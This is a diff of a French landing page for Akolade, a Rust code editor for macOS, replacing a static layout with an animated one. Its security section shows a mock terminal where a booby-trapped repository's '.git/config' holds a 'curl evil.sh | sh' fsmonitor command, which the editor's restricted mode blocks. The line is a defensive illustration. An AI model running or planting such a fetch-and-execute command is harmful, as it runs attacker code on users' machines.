+.copy { font: 600 14px var(--sans); color: var(--bg); background: var(--ink); border: 0; border-radius: 10px; padding: 9px 16px; cursor: pointer; transition: transform .2s; }
+.copy:hover { transform: translateY(-1px); }
+.install .reqs { margin-top: 30px; color: var(--muted); font-size: 15px; }
 
-    .pair { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; margin-top: 40px; }
-    @media (max-width: 760px) { .pair { grid-template-columns: 1fr; } }
+/* ---------- Footer ---------- */
+footer { position: relative; padding: 60px 24px 50px; border-top: 1px solid var(--line); overflow: hidden; }
+footer .big { font: 800 clamp(80px, 19vw, 260px)/0.85 var(--sans); letter-spacing: -0.06em; color: transparent; -webkit-text-stroke: 1px rgb(255 255 255 / 0.1); text-align: center; margin: 0 0 40px; user-select: none; }
+footer .cols { max-width: 1180px; margin: 0 auto; display: flex; flex-wrap: wrap; gap: 20px 40px; justify-content: space-between; color: var(--dim); font-size: 14px; }
+footer .cols p { margin: 0; max-width: 560px; }
+footer .cols nav { display: flex; gap: 22px; }
+footer a { color: var(--muted); }
 
-    .note { font-size: 15px; color: var(--muted); max-width: 68ch; }
-
-    pre { margin: 0 0 20px; padding: 16px 18px; background: var(--code-bg); border-radius: var(--radius); overflow-x: auto; line-height: 1.55; }
-    pre code { background: none; padding: 0; font-size: 1em; }
-    .steps { counter-reset: step; margin: 0; padding: 0; list-style: none; max-width: 760px; }
-    .steps > li { counter-increment: step; position: relative; padding-left: 44px; margin-bottom: 28px; }
-    .steps > li::before { content: counter(step); position: absolute; left: 0; top: 0; width: 28px; height: 28px; border-radius: 50%; border: 1px solid var(--line); display: grid; place-items: center; font-size: 14px; font-weight: 600; color: var(--muted); }
-    .steps h3 { font-size: 19px; }
-    .steps p { margin: 0 0 12px; }
-
-    .closing { margin-top: 48px; padding-top: 56px; padding-bottom: 56px; }
-    .closing h2 { margin: 0 0 10px; font-size: 34px; }
-    .closing p { margin: 0 0 24px; color: var(--muted); font-size: 19px; }
-
-    footer.site { padding: 32px 0 48px; border-top: 1px solid var(--line); font-size: 14px; color: var(--muted); }
-    footer.site p { margin: 0 0 8px; max-width: 80ch; }
-  </style>
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation: none !important; transition: none !important; }
+  h1 .w > span, .hero-copy p, .cta { transform: none; opacity: 1; }
+  .reveal { opacity: 1; transform: none; }
+  .win { --tilt: 0deg !important; --sc: 1 !important; }
+}
+</style>
 </head>
 <body>
-  <a class="skip" href="#main">Aller au contenu</a>
+<a class="skip" href="#demo">Aller au contenu</a>
 
-  <header class="site">
-    <div class="wrap">
-      <a class="brand" href="./"><img src="images/akolade.svg" alt="" width="28" height="28">Akolade</a>
-      <nav class="site" aria-label="Sections">
-        <a href="#fonctionnalites">Fonctionnalités</a>
-        <a href="#claude-code">Claude Code</a>
-        <a href="#securite">Sécurité</a>
-        <a href="#performances">Performances</a>
-        <a class="keep" href="#installer">Installer</a>
-        <a class="keep" href="https://github.com/emmanuellion/akolade">GitHub</a>
-      </nav>
+<nav class="nav" aria-label="Sections">
+  <a class="brand" href="#top"><img src="images/akolade.svg" alt="">Akolade</a>
+  <a class="l" href="#visite">Visite</a>
+  <a class="l" href="#themes">Thèmes</a>
+  <a class="l" href="#outils">Outils</a>
+  <a class="l" href="#securite">Sécurité</a>
+  <a class="l" href="#installer">Installer</a>
+  <a class="gh" href="https://github.com/emmanuellion/akolade">GitHub</a>
+</nav>
+
+<header class="hero" id="top">
+  <div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+  <div class="floor" aria-hidden="true"></div>
+  <div class="spot" aria-hidden="true"></div>
+  <div class="hero-copy">
+    <div class="braces" aria-hidden="true">{ }</div>
+    <span class="eyebrow"><b>Libre</b>Rust, gpui, macOS</span>
+    <h1>
+      <span class="w"><span style="animation-delay:.05s">Le</span></span>
+      <span class="w"><span style="animation-delay:.12s">code,</span></span>
+      <span class="w"><span style="animation-delay:.19s">Git</span></span>
+      <span class="w"><span style="animation-delay:.26s">et</span></span>
+      <span class="w"><span class="grad" style="animation-delay:.33s">Claude</span></span><br>
+      <span class="w"><span style="animation-delay:.42s">dans</span></span>
+      <span class="w"><span style="animation-delay:.49s">une</span></span>
+      <span class="w"><span style="animation-delay:.56s">fenêtre.</span></span>
+    </h1>
+    <p>Akolade est un éditeur de code natif, dessiné par la carte graphique. Il s'ouvre en <strong>0,05 s</strong> et embarque Git, un terminal, Claude Code et quinze outils.</p>
+    <div class="cta">
+      <a class="btn main" href="#installer">Installer Akolade</a>
+      <a class="btn ghost" href="#visite">Faire la visite</a>
     </div>
-  </header>
+  </div>
 
-  <main id="main">
-    <div class="wrap hero">
-      <p class="kicker">Logiciel libre, écrit en Rust avec gpui, sous licence GPL-3.0</p>
-      <h1>Un éditeur de code natif pour macOS.</h1>
-      <p class="lead">
-        Akolade réunit l'éditeur, Git, un terminal, Claude Code et quinze outils de développement dans une seule fenêtre.
-        Il s'ouvre en <strong>0,05 s</strong>, reste à <strong>0,3 % de CPU</strong> au repos, et n'exécute jamais le code d'un projet que vous n'avez pas approuvé.
-      </p>
-      <div class="actions">
-        <a class="button primary" href="#installer">Compiler Akolade</a>
-        <a class="button" href="https://github.com/emmanuellion/akolade">Voir le code sur GitHub</a>
+  <div class="stage" id="demo">
+    <div class="win" id="win" role="img" aria-label="Démonstration animée : du code Rust s'écrit dans l'éditeur, puis Claude Code corrige la fonction moyenne après avoir demandé l'autorisation de modifier le fichier.">
+      <div class="bar"><i></i><i></i><i></i><span>akolade : src/meteo.rs</span></div>
+      <div class="body" aria-hidden="true">
+        <div class="act">
+          <svg class="on" viewBox="0 0 24 24"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg>
+          <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+          <svg viewBox="0 0 24 24"><line x1="6" x2="6" y1="3" y2="15"/><circle cx="18" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M18 9a9 9 0 0 1-9 9"/></svg>
+          <svg class="on" viewBox="0 0 24 24"><path d="M12 4H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-6"/><path d="m7 10 3 3-3 3"/><path d="M13 16h4"/></svg>
+          <svg viewBox="0 0 24 24"><path d="M12 3v14"/><path d="M5 10h14"/><path d="M5 21h14"/></svg>
+        </div>
+        <div class="tree">
+          <small>EXPLORATEUR</small>
+          <div>▾ src</div>
+          <div>&nbsp;&nbsp;main.rs</div>
+          <div class="sel" id="meteoFile">&nbsp;&nbsp;meteo.rs</div>
+          <div>&nbsp;&nbsp;stats.rs</div>
+          <div>Cargo.toml</div>
+          <div>README.md</div>
+        </div>
+        <div class="ed" id="editor"></div>
+        <div class="cc">
+          <header><span class="ic"><svg viewBox="0 0 24 24"><path d="M12 4H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-6"/><path d="m7 10 3 3-3 3"/><path d="M13 16h4"/></svg></span><div><strong>Claude Code</strong><small>demander, dans ~/meteo</small></div></header>
+          <div class="chat" id="chat"></div>
+          <div class="composer">Demandez quelque chose à Claude… <b>Envoyer</b></div>
+        </div>
       </div>
-      <p class="platform">macOS, testé sur Apple Silicon. Interface en français.</p>
     </div>
+  </div>
+</header>
 
-    <div class="wrap shot-main">
-      <figure>
-        <img src="images/editeur.png" width="1600" height="1026" alt="Akolade avec le thème sombre Minuit : l'explorateur à gauche marque deux fichiers modifiés, l'éditeur affiche src/git.rs avec sa coloration Rust.">
-        <figcaption>Le code source d'Akolade ouvert dans Akolade. Les fichiers modifiés sont marqués dans l'explorateur, la barre d'état montre la branche Git.</figcaption>
-      </figure>
-    </div>
+<main>
+  <div class="ribbon" aria-label="Les 35 langages colorés par Akolade">
+    <p><b>35 langages</b>, chacun avec sa couleur, colorés par tree-sitter</p>
+    <div class="row" id="langs1"></div>
+    <div class="row rev" id="langs2"></div>
+  </div>
 
+  <section class="tour" id="visite">
     <div class="wrap">
-      <div class="stats" role="list">
-        <div role="listitem"><strong>0,05 s</strong><span>avant que la fenêtre apparaisse</span></div>
-        <div role="listitem"><strong>174 Mo</strong><span>de mémoire, projet ouvert</span></div>
-        <div role="listitem"><strong>0,3 %</strong><span>de CPU au repos</span></div>
-        <div role="listitem"><strong>1</strong><span>processus, sans Electron</span></div>
+      <p class="kick">La visite</p>
+      <h2 class="reveal">Une journée de travail,<br><span class="grad">sans changer d'app.</span></h2>
+      <div class="grid">
+        <div class="steps" style="position:relative">
+          <div class="rail" aria-hidden="true"><i id="rail"></i></div>
+          <article class="step" data-shot="0" data-glow="#4b55ff">
+            <div class="num">01</div>
+            <h3>Ouvrir et écrire</h3>
+            <p>L'explorateur marque les fichiers modifiés, la complétion classe les mots selon le contexte, et <kbd>⌘R</kbd> lance le fichier ouvert.</p>
+          </article>
+          <article class="step" data-shot="1" data-glow="#28c840">
+            <div class="num">02</div>
+            <h3>Relire et committer</h3>
+            <p>Le diff de chaque fichier, l'indexation, les branches et les remises. Les lignes modifiées sont aussi marquées dans la marge.</p>
+          </article>
+          <article class="step" data-shot="2" data-glow="#d97757">
+            <div class="num">03</div>
+            <h3>Déléguer à Claude</h3>
+            <p>Il lit, modifie et lance ses commandes sous vos yeux. Chaque action a sa carte, et le coût de la session reste affiché à droite.</p>
+          </article>
+          <article class="step" data-shot="3" data-glow="#a35cff">
+            <div class="num">04</div>
+            <h3>S'équiper</h3>
+            <p>81 outils, plugins et thèmes dans le Store, installés en arrière-plan : complétion, formateurs, linters, Docker, Kubernetes, tests…</p>
+          </article>
+          <article class="step" data-shot="4" data-glow="#9cc8ff">
+            <div class="num">05</div>
+            <h3>Le faire à votre goût</h3>
+            <p>Vingt thèmes sombres ou clairs, huit façons de dessiner les fichiers, et l'import d'un thème VS Code.</p>
+          </article>
+        </div>
+        <div class="frame">
+          <div class="shots" id="shots">
+            <div class="glow" id="glow"></div>
+            <img class="on" src="images/editeur.png" alt="L'éditeur avec l'explorateur et un fichier Rust ouvert." width="1600" height="1026">
+            <img src="images/git.png" alt="L'outil Git et le diff d'un fichier." width="1600" height="1026" loading="lazy">
+            <img src="images/claude.png" alt="Claude Code qui lit un fichier et répond, avec le coût de la session." width="1600" height="1026" loading="lazy">
+            <img src="images/store.png" alt="Le Store d'Akolade." width="1600" height="1026" loading="lazy">
+            <img src="images/theme-clair.png" alt="Akolade avec le thème clair Aube." width="1600" height="1026" loading="lazy">
+          </div>
+        </div>
       </div>
     </div>
+  </section>
 
-    <section id="fonctionnalites">
-      <div class="wrap">
-        <h2>Fonctionnalités</h2>
-        <p class="intro">Ce qu'on attend d'un éditeur moderne, sans extension à chercher : tout est là au premier lancement ou s'installe d'un clic depuis le Store.</p>
-        <ul class="features">
-          <li>
-            <h3>35 langages colorés</h3>
-            <p>Coloration par tree-sitter, chaque langage avec sa couleur : Python en bleu, Rust en orange, JavaScript en jaune. Deux fichiers côte à côte avec <kbd>⌘\</kbd>, aperçu Markdown à côté du code.</p>
-          </li>
-          <li>
-            <h3>Une complétion qui marche sans rien installer</h3>
-            <p>Elle apprend les mots du fichier et les classe selon le contexte. Avec un serveur de langage du Store, elle connaît en plus les méthodes des objets, les types et la documentation, et ajoute l'aller à la définition (<kbd>F12</kbd>) et le renommage (<kbd>F2</kbd>).</p>
-          </li>
-          <li>
-            <h3>Formatage et linters</h3>
-            <p>Prettier, ruff, rustfmt, gofmt, clang-format et quatre autres formateurs sur <kbd>⌥⇧F</kbd>. ESLint, ruff, ShellCheck, hadolint et Clippy soulignent les erreurs pendant la frappe.</p>
-          </li>
-          <li>
-            <h3>Git intégré</h3>
-            <p>Modifications avec leur diff, indexation, commit, historique, branches, remises, push et pull. Les lignes modifiées sont marquées dans la marge de l'éditeur.</p>
-          </li>
-          <li>
-            <h3>Le projet sous la main</h3>
-            <p>Recherche et remplacement dans tous les fichiers (<kbd>⇧⌘F</kbd>), panneau des TODO, scripts de <code>package.json</code> et du <code>Makefile</code>, terminal intégré, bouton Exécuter (<kbd>⌘R</kbd>) qui connaît déjà 22 langages.</p>
-          </li>
-          <li>
-            <h3>20 thèmes et 8 packs d'icônes</h3>
-            <p>Sombres ou clairs, chacun colore aussi le code et le terminal. Un thème VS Code au format JSON s'importe tel quel.</p>
-          </li>
+  <section class="lab" id="themes">
+    <div class="wrap">
+      <p class="kick">L'atelier des thèmes</p>
+      <h2 class="reveal">Vingt thèmes.<br><span class="grad">Essayez-les ici.</span></h2>
+      <p class="sub reveal">Ce sont les vraies palettes d'Akolade, recopiées de son code source. Chaque thème colore l'interface, le code et le terminal.</p>
+      <div class="grid">
+        <div>
+          <div class="chips" id="chips" role="radiogroup" aria-label="Thèmes"></div>
+          <p class="note" id="themeNote"></p>
+        </div>
+        <div class="tw" id="tw">
+          <div class="tb"><i></i><i></i><i></i><span id="twName">Minuit</span><b class="run">Exécuter</b></div>
+<pre aria-label="Exemple de code coloré par le thème choisi"><div><b>1</b><span class="c">// Le relevé le plus chaud de la semaine</span></div><div><b>2</b><span class="k">pub fn</span> <span class="f">plus_chaud</span><span class="o">(</span><span class="p">releves</span><span class="o">: &amp;[</span><span class="t">Releve</span><span class="o">]) -&gt;</span> <span class="t">Option</span><span class="o">&lt;&amp;</span><span class="t">Releve</span><span class="o">&gt; {</span></div><div><b>3</b>    <span class="p">releves</span><span class="o">.</span><span class="f">iter</span><span class="o">()</span></div><div><b>4</b>        <span class="o">.</span><span class="f">filter</span><span class="o">(|</span><span class="p">r</span><span class="o">|</span> <span class="p">r</span><span class="o">.</span><span class="p">ville</span> <span class="o">!=</span> <span class="s">"Inconnue"</span><span class="o">)</span></div><div><b>5</b>        <span class="o">.</span><span class="f">max_by</span><span class="o">(|</span><span class="p">a</span><span class="o">,</span> <span class="p">b</span><span class="o">|</span> <span class="p">a</span><span class="o">.</span><span class="p">temperature</span><span class="o">.</span><span class="f">total_cmp</span><span class="o">(&amp;</span><span class="p">b</span><span class="o">.</span><span class="p">temperature</span><span class="o">))</span></div><div><b>6</b><span class="o">}</span></div><div><b>7</b></div><div><b>8</b><span class="k">const</span> <span class="t">SEUIL</span><span class="o">:</span> <span class="t">f32</span> <span class="o">=</span> <span class="n">38.5</span><span class="o">;</span></div></pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="orbit-sec" id="outils">
+    <div class="wrap grid">
+      <div>
+        <p class="kick">Les outils</p>
+        <h2 class="reveal">Quinze outils<br><span class="grad">en orbite.</span></h2>
+        <div class="info" id="info" aria-live="polite">
+          <p class="sub">Chaque outil ajouté depuis le Store a son icône dans la barre de gauche. Survolez-en un pour savoir ce qu'il fait.</p>
+        </div>
+      </div>
+      <div class="orbit" id="orbit">
+        <div class="core"><img src="images/akolade.svg" alt="Akolade"></div>
+        <div class="ring r1" id="r1"></div>
+        <div class="ring r2" id="r2"></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="securite">
+    <div class="wrap grid">
+      <div>
+        <p class="kick">Le mode restreint</p>
+        <h2 class="reveal">Ouvrir un projet piégé.<br><span class="grad">Il ne se passe rien.</span></h2>
+        <p class="sub">Un dépôt téléchargé peut cacher des commandes que vos outils lancent tout seuls. Akolade ne les exécute pas tant que vous ne faites pas confiance au dossier.</p>
+        <ul>
+          <li><b>Git</b> se met en pause si le dépôt configure une commande.</li>
+          <li><b>ESLint et Clippy</b> attendent : ils exécutent la configuration du projet.</li>
+          <li><b>Claude Code, les tests et les scripts</b> demandent votre accord.</li>
         </ul>
       </div>
-    </section>
-
-    <section id="claude-code">
-      <div class="wrap">
-        <h2>Claude Code, dans un onglet</h2>
-        <p class="intro">Si Claude Code est installé sur votre Mac, Akolade en fait une conversation à côté de votre code. C'est votre propre <code>claude</code> qui tourne, avec vos réglages et votre abonnement.</p>
-        <div class="split">
-          <ul>
-            <li><strong>Chaque action de Claude a sa carte</strong> : la commande lancée, le fichier lu, le diff d'une modification. Les onglets ouverts se rechargent dès qu'il modifie un fichier.</li>
-            <li><strong>Vous autorisez d'un clic</strong>, dans la carte même. Ses questions à choix multiples s'affichent en boutons.</li>
-            <li><strong>Quatre modes</strong> : Demander, Modifs auto, Plan, et Tout autoriser après confirmation. Le modèle, l'effort et un budget maximum se règlent par défaut dans les paramètres.</li>
-            <li><strong>Le coût reste visible</strong> : tokens, remplissage du contexte, limites de l'abonnement sur 5 heures et 7 jours, historique des 14 derniers jours.</li>
-            <li><strong>Les conversations passées</strong> du projet se reprennent d'un clic, même celles de plusieurs milliers de messages.</li>
-          </ul>
-          <figure>
-            <img src="images/claude.png" width="1600" height="1026" loading="lazy" alt="L'outil Claude Code : une question sur src/trust.rs, la carte de lecture du fichier, la réponse en trois points, et à droite le coût de la session, les tokens, le contexte et les limites de l'abonnement.">
-            <figcaption>Une question sur le code, la lecture du fichier par Claude, sa réponse. À droite, ce que la session a coûté.</figcaption>
-          </figure>
+      <div>
+        <div class="term" id="term" role="img" aria-label="Scène animée : un projet piégé est ouvert dans Akolade, et trois commandes cachées sont bloquées par le mode restreint.">
+          <div class="tb" aria-hidden="true"><i></i><i></i><i></i></div>
+          <div class="lines" aria-hidden="true">
+            <div class="ln"><span class="pr">~ $</span> git clone https://exemple.dev/projet-piege</div>
+            <div class="ln dimt">Clonage dans 'projet-piege'… terminé.</div>
+            <div class="ln"><span class="pr">~ $</span> open -a Akolade projet-piege</div>
+            <div class="ln"> </div>
+            <div class="ln warn">⚠ Dossier inconnu : mode restreint</div>
+            <div class="ln blk">✕ .git/config        core.fsmonitor = "curl evil.sh | sh"   bloqué</div>
+            <div class="ln blk">✕ eslint.config.js   exécution du projet                   en pause</div>
+            <div class="ln blk">✕ .claude/settings   hook SessionStart                    en attente de votre accord</div>
+            <div class="ln"> </div>
+            <div class="ln ok">✓ 0 commande exécutée. Le projet s'ouvre, en lecture.</div>
+          </div>
         </div>
-      </div>
-    </section>
-
-    <section id="outils">
-      <div class="wrap">
-        <h2>Quinze outils, au même endroit</h2>
-        <p class="intro">Chaque outil ajouté depuis le Store a son icône dans la barre de gauche. Il s'affiche à la place de l'éditeur, et un clic sur un fichier vous y ramène.</p>
-        <div class="table-scroll">
-          <table>
-            <thead><tr><th scope="col">Outil</th><th scope="col">Ce qu'il fait</th></tr></thead>
-            <tbody>
-              <tr><td>Client HTTP</td><td>Envoie une requête avec ses en-têtes et son corps, affiche le code, la durée et le JSON mis en forme. Les requêtes s'enregistrent dans le projet.</td></tr>
-              <tr><td>Docker</td><td>Démarre, arrête ou supprime un conteneur, montre ses logs, ouvre un shell dans le terminal.</td></tr>
-              <tr><td>Kubernetes</td><td>Pods, déploiements et services par namespace, avec logs, shell, mise à l'échelle et redirection de port.</td></tr>
-              <tr><td>Tests</td><td>Lance cargo, go, pytest, jest ou vitest et montre le message de chaque échec, à un clic du test.</td></tr>
-              <tr><td>Pull requests</td><td>Les PR GitHub et GitLab du dépôt, leurs commentaires, l'état des tests et des relectures.</td></tr>
-              <tr><td>Base de données</td><td>Les bases SQLite du projet : tables, lignes et requêtes, en lecture seule par défaut.</td></tr>
-              <tr><td>Variables d'environnement</td><td>Les fichiers <code>.env</code> en tableau, secrets masqués, variables manquantes par rapport à <code>.env.example</code>.</td></tr>
-              <tr><td>Dépendances</td><td>Les paquets npm, Cargo, Python et Go, leurs mises à jour et l'audit de sécurité. Rien n'est jamais installé.</td></tr>
-              <tr><td>Statistiques</td><td>Lignes de code par langage, plus gros fichiers, fichiers les plus modifiés et contributeurs.</td></tr>
-              <tr><td>Aperçu en direct</td><td>Un serveur local pour vos pages HTML, rechargées à chaque enregistrement.</td></tr>
-              <tr><td>Ports ouverts</td><td>Les programmes qui écoutent sur un port de votre Mac, à ouvrir ou à arrêter.</td></tr>
-              <tr><td>Comparateur</td><td>Deux textes ou deux fichiers, ligne par ligne ou côte à côte.</td></tr>
-              <tr><td>Boîte à outils</td><td>JSON, Base64, URL, JWT, SHA-256, horodatages et UUID.</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <p class="note">Avec Git et Claude Code, cela fait quinze. Le Store propose aussi 24 plugins de complétion, 9 formateurs, 5 linters, 20 thèmes et 8 packs d'icônes.</p>
-        <div class="pair">
-          <figure>
-            <img src="images/git.png" width="1600" height="1026" loading="lazy" alt="L'outil Git : la liste des deux fichiers modifiés et le diff de explorer.rs, une ligne supprimée en rouge et une ajoutée en vert.">
-            <figcaption>L'outil Git et le diff d'un fichier modifié.</figcaption>
-          </figure>
-          <figure>
-            <img src="images/store.png" width="1600" height="1026" loading="lazy" alt="Le Store : catégories à gauche (outils, complétion, formatage, linters, thèmes, icônes) et les fiches des outils Git, Claude Code, Client HTTP et Docker.">
-            <figcaption>Le Store : 81 outils, plugins et thèmes, installés en arrière-plan.</figcaption>
-          </figure>
-        </div>
-      </div>
-    </section>
-
-    <section id="securite">
-      <div class="wrap">
-        <h2>Ouvrir un projet n'exécute pas son code</h2>
-        <div class="prose">
-          <p>Beaucoup d'outils exécutent le code d'un projet dès son ouverture : ESLint lance <code>eslint.config.js</code>, Clippy compile les <code>build.rs</code>, Git suit les commandes de <code>.git/config</code>, Claude Code lance les hooks de <code>.claude/settings.json</code>. Un dépôt cloné ou une archive téléchargée peut en profiter.</p>
-          <p>Dans Akolade, un dossier ouvert pour la première fois est en <strong>mode restreint</strong>, signalé dans la barre d'état. Rien de ce qui exécute son code ne démarre : ces linters et certains serveurs de langage attendent, les programmes fournis par le projet ne remplacent jamais les vôtres, et Git se met en pause si le dépôt configure une commande. Claude Code, les tests et les scripts demandent votre accord avant de démarrer.</p>
-          <p>Un clic sur « Mode restreint » fait confiance au dossier. Akolade s'en souvient, et la liste se gère dans les paramètres.</p>
-          <p>Akolade n'a ni compte ni télémétrie, et ne se connecte à rien de lui-même.</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="performances">
-      <div class="wrap">
-        <h2>Performances</h2>
-        <p class="intro">L'interface est dessinée sur la carte graphique, depuis un seul processus Rust. Quand la fenêtre passe en arrière-plan, Akolade arrête de relire Git et l'explorateur.</p>
-        <div class="table-scroll">
-          <table>
-            <thead><tr><th scope="col">Mesure</th><th scope="col">Akolade</th></tr></thead>
-            <tbody>
-              <tr><td>Lancement jusqu'à l'apparition de la fenêtre</td><td class="num">0,05 s</td></tr>
-              <tr><td>Mémoire, projet ouvert</td><td class="num">174 Mo</td></tr>
-              <tr><td>CPU au repos, fenêtre active ou en arrière-plan</td><td class="num">0,3 %</td></tr>
-              <tr><td>Processus</td><td class="num">1, plus un par serveur de langage utilisé</td></tr>
-              <tr><td>Taille du programme</td><td class="num">73 Mo</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <p class="note">Mesuré sur un MacBook Pro M5 Pro sous macOS 27.0.1, version release, avec le code source d'Akolade ouvert comme projet. Trois lancements ; temps mesuré jusqu'à ce que macOS voie la fenêtre, mémoire (RSS) et CPU relevés avec <code>ps</code> après six secondes d'inactivité.</p>
-      </div>
-    </section>
-
-    <section id="installer">
-      <div class="wrap">
-        <h2>Installer</h2>
-        <p class="intro">Akolade se compile pour l'instant depuis les sources. Il faut un Mac, Rust 1.85 ou plus récent et Git. Xcode n'est pas nécessaire.</p>
-        <ol class="steps">
-          <li>
-            <h3>Installer Rust et Git</h3>
-            <p>Si ce n'est pas déjà fait :</p>
-<pre><code>curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-xcode-select --install</code></pre>
-          </li>
-          <li>
-            <h3>Récupérer le code et le compiler</h3>
-            <p>La première compilation prend quelques minutes.</p>
-<pre><code>git clone https://github.com/emmanuellion/akolade.git
-cd akolade
-cargo run --release</code></pre>
-          </li>
-          <li>
-            <h3>Ouvrir un projet</h3>
-            <p>Avec <kbd>⇧⌘O</kbd>, ou directement depuis le terminal :</p>
-<pre><code>cargo run --release -- ~/mon-projet</code></pre>
-            <p class="note">Node.js, Claude Code, Docker, kubectl et <code>gh</code> sont facultatifs. Chaque outil indique ce qui lui manque et comment l'installer.</p>
-          </li>
-        </ol>
-      </div>
-    </section>
-
-    <div class="wrap closing">
-      <h2>Essayez Akolade sur vos projets</h2>
-      <p>Libre, sans compte. Il ouvre les dossiers que vous avez déjà.</p>
-      <div class="actions">
-        <a class="button primary" href="#installer">Compiler Akolade</a>
-        <a class="button" href="https://github.com/emmanuellion/akolade">Voir le code sur GitHub</a>
+        <div class="shield" id="shield">⚠ Mode restreint : le projet attend votre accord</div>
       </div>
     </div>
-  </main>
+  </section>
 
-  <footer class="site">
+  <section class="install" id="installer">
     <div class="wrap">
-      <p>Akolade est un logiciel libre sous licence GPL-3.0-or-later, créé par <a href="https://github.com/emmanuellion">Emmanuel Lion</a>. Il s'appuie sur gpui de Zed Industries et gpui-component de Longbridge.</p>
-      <p>Claude et Claude Code sont des marques d'Anthropic. Akolade n'est ni affilié à Anthropic ni soutenu par elle.</p>
-      <p>Un bug ou une idée ? <a href="https://github.com/emmanuellion/akolade/issues">Ouvrez une issue</a>.</p>
+      <p class="kick">Installer</p>
+      <h2 class="reveal">Trois commandes.<br><span class="grad">C'est parti.</span></h2>
+      <div class="box">
+        <div class="in">
+<pre id="cmd"><span class="pr">$ </span>git clone https://github.com/emmanuellion/akolade.git
+<span class="pr">$ </span>cd akolade
+<span class="pr">$ </span>cargo run --release</pre>
+          <div class="row"><span id="copyMsg">La première compilation prend quelques minutes.</span><button class="copy" id="copy" type="button">Copier les commandes</button></div>
+        </div>
+      </div>
+      <p class="reqs">Un Mac, <a href="https://rustup.rs">Rust 1.85</a> ou plus récent, et Git. Xcode n'est pas nécessaire.</p>
     </div>
-  </footer>
+  </section>
+</main>
+
+<footer>
+  <div class="big" aria-hidden="true">Akolade</div>
+  <div class="cols">
+    <p>Logiciel libre sous licence GPL-3.0-or-later, créé par <a href="https://github.com/emmanuellion">Emmanuel Lion</a>. Construit avec gpui (Zed Industries) et gpui-component (Longbridge). Claude et Claude Code sont des marques d'Anthropic ; Akolade n'est pas affilié à Anthropic.</p>
+    <nav aria-label="Liens"><a href="https://github.com/emmanuellion/akolade">Code source</a><a href="https://github.com/emmanuellion/akolade/issues">Signaler un bug</a><a href="../">Autres projets</a></nav>
+  </div>
+</footer>
+
+<script>
+const reduced = matchMedia('(prefers-reduced-motion: reduce)').matches;
+const $ = (s) => document.querySelector(s);
+const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+
+/* ---------- Hero: spotlight and the window straightening on scroll ---------- */
+const hero = $('.hero'), win = $('#win');
+hero.addEventListener('pointermove', (e) => {
+  const r = hero.getBoundingClientRect();
+  hero.style.setProperty('--mx', `${e.clientX - r.left}px`);
+  hero.style.setProperty('--my', `${e.clientY - r.top}px`);
+});
+function tilt() {
+  if (reduced) return;
+  const r = win.getBoundingClientRect();
+  const p = Math.min(1, Math.max(0, 1 - (r.top - innerHeight * 0.18) / (innerHeight * 0.55)));
+  win.style.setProperty('--tilt', `${24 * (1 - p)}deg`);
+  win.style.setProperty('--sc', `${0.9 + 0.1 * p}`);
+}
+addEventListener('scroll', () => requestAnimationFrame(tilt), { passive: true });
+tilt();
+
+/* ---------- Hero: a tiny Rust highlighter, then the scripted demo ---------- */
+const KW = new Set(['pub', 'fn', 'struct', 'let', 'if', 'return', 'as', 'use', 'mut', 'impl', 'for', 'in', 'const']);
+const TY = /^(String|f32|usize|Self|Releve|Vec|Option)$/;
+function hl(line) {
+  return line.replace(/(\/\/.*$)|("[^"]*")|(\b\d+(?:\.\d+)?\b)|([A-Za-z_][A-Za-z0-9_]*)(?=\s*\()|([A-Za-z_][A-Za-z0-9_]*)|([{}()[\];:,.<>=&|!+\-*/]+)/g,
+    (m, com, str, num, fn, id, op) => {
+      if (com) return `<span class="c">${esc(com)}</span>`;
+      if (str) return `<span class="s">${esc(str)}</span>`;
+      if (num) return `<span class="n">${num}</span>`;
+      if (fn) return KW.has(fn) ? `<span class="k">${fn}</span>` : `<span class="f">${fn}</span>`;
+      if (id) return KW.has(id) ? `<span class="k">${id}</span>` : TY.test(id) ? `<span class="t">${id}</span>` : `<span class="p">${id}</span>`;
+      return `<span class="o">${esc(op)}</span>`;
+    });
+}
+const CODE = [
+  '// Relevés météo de la semaine',
+  'pub struct Releve {',
+  '    pub ville: String,',
+  '    pub temperature: f32,',
+  '}',
+  '',
+  'pub fn moyenne(releves: &[Releve]) -> f32 {',
+  '    let total: f32 = releves.iter().map(|r| r.temperature).sum();',
+  '    total / releves.len() as f32',
+  '}',
+];
+const FIXED = CODE.slice(0, 8).concat(['    if releves.is_empty() {', '        return 0.0;', '    }', '    total / releves.len() as f32', '}']);
+const editor = $('#editor'), chat = $('#chat');
+function paint(lines, typed, caretLine, flash = []) {
+  editor.innerHTML = lines.map((l, i) => {
+    const shown = typed === undefined || i < caretLine ? l : i === caretLine ? l.slice(0, typed) : '';
+    const caret = i === caretLine ? '<span class="caret"></span>' : '';
+    return `<div class="ln${flash.includes(i) ? ' flash' : ''}"><b>${i + 1}</b><span>${hl(shown)}${caret}</span></div>`;
+  }).join('');
+}
+const wait = (ms) => new Promise((r) => setTimeout(r, ms));
+function add(html, cls = 'msg') {
+  const d = document.createElement('div');
+  d.className = cls; d.innerHTML = html; chat.appendChild(d);
+  requestAnimationFrame(() => requestAnimationFrame(() => d.classList.add('in')));
+  return d;
+}
+async function stream(el, text) {
+  for (let i = 0; i < text.length; i += 2) { el.textContent = text.slice(0, i); await wait(18); }
+  el.textContent = text;
+}
